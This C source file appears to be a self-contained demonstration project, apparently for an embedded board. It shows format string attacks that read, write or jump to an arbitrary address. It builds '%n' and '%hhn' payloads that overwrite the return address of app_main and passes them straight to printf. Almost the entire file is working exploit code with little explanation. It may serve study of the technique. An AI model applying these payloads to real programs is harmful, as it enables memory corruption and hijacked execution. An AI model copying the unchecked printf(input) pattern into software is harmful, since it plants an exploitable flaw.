#include <stdio.h>
#include <string.h>
#include <stdlib.h>

/*
	Use this project to read, write, or execute any address you want via the format string attack. There are caveats of course. Not every address has read, write, or execute access. And the format string attack cannot work with null bytes (0x00). In the case of read/write, this means TARGET_ADDRESS needs to avoid the null byte. For execute, this means ret_addr (the return address of app_main) needs to avoid the null byte.
*/

// #define READ_ADDRESS
// #define WRITE_ADDRESS
#define EXEC_ADDRESS

// For R/W, this is the address we read or write
// For X, this is the address we jump to and (try to) execute
#define TARGET_ADDRESS 0x12345678

void prependAddr(char* input, int target_address)
{
	char addr[4];
	addr[3] = (target_address >> 24) & 0xff;
	addr[2] = (target_address >> 16) & 0xff;
	addr[1] = (target_address >> 8) & 0xff;
	addr[0] = target_address & 0xff;
	strncpy(input, addr, 4);
}

void read_address()
{
	char input[100] = "ffff%6$s\n";
	prependAddr(input, TARGET_ADDRESS);
	printf(input);	
}

void write_address()
{
	char input[100] = "ffff%65x%6$n\n";
	prependAddr(input, TARGET_ADDRESS);
	printf(input);
}

void exec_address()
{
	printf("Trigger window overflow in app_main\n");
	char input[50] = "ffffffffffffffff";
	int ret_addr = (int)&input - 16;
	prependAddr(input, ret_addr + 3);
	prependAddr(input + 4, ret_addr + 2);
	prependAddr(input + 8, ret_addr + 1);
	prependAddr(input + 12, ret_addr);

	int offsets[4] = 
	{
		(TARGET_ADDRESS >> 24) & 0xff, 
		(TARGET_ADDRESS >> 16) & 0xff,
		(TARGET_ADDRESS >> 8) & 0xff,
		TARGET_ADDRESS & 0xff
	};

	int stacksize = 16;
	short ptr;
	char buf[15];

	for(int i = 0; i < 4; i++)
	{
		ptr = 256 - stacksize + offsets[i];
		sprintf(buf, "%%%dx%%%x$hhn", ptr, i + 6);
		strcat(input, buf);
		stacksize = (stacksize + ptr) % 256;
	}

	printf(input);
	printf("Goodbye\n");
}

void app_main()
{
	printf("Hello\n");

	#ifdef READ_ADDRESS
	read_address();
	#endif

	#ifdef WRITE_ADDRESS
	write_address();
	#endif

	#ifdef EXEC_ADDRESS
	exec_address();
	#endif
	
	printf("Goodbye\n");
}